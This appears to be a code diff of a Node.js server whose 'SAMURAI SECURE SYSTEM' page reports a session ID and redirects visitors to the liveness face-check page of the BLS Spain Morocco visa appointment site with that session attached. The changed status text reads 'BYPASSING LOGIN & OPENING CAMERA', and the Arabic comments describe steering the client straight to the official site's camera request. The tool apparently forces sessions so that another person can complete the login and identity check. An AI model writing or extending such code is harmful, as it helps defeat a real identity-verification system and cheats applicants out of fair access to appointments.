@@ -11,7 +11,7 @@ const server = http.createServer((req, res) => {
 
     if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
 
-    // 🔥 توجيه العميل للصفحة التي تقبل الجلسة بدون خطأ 405
+    // 🔥 توجيه العميل مباشرة إلى رابط الـ livenessrequest الخاص بالموقع الرسمي
     if (req.method === 'GET' && req.url.startsWith('/liveness')) {
         res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
         res.end(`
@@ -28,7 +28,7 @@ const server = http.createServer((req, res) => {
             </head>
             <body>
                 <h1>SAMURAI SECURE SYSTEM</h1>
-                <p id="status">[ INITIALIZING SECURE CONNECTION... ]</p>
+                <p id="status">[ BYPASSING LOGIN & OPENING CAMERA... ]</p>
                 <div class="spinner"></div>
 
                 <script>
@@ -44,11 +44,10 @@ const server = http.createServer((req, res) => {
                             body: JSON.stringify({ type: "CLIENT_CONNECTED", session_id: sessionId })
                         }).catch(e => {});
 
-                        // التوجيه إلى الصفحة الأساسية للموقع مع حفظ الكود في التخزين المحلي ليتم استخدامه
+                        // التوجيه المباشر لصفحة طلب الكاميرا الفعلية مع تمرير الـ session
                         setTimeout(() => {
-                            localStorage.setItem('samurai_forced_session', sessionId);
-                            window.location.href = "https://www.blsspainmorocco.net/MAR/appointment/liveness?code=" + sessionId;
-                        }, 1500);
+                            window.location.href = "https://www.blsspainmorocco.net/MAR/appointment/LivenessRequest?session=" + sessionId;
+                        }, 1200);
                     } else {
                         document.getElementById('status').innerText = "[ ERROR: INVALID SESSION ]";
                     }
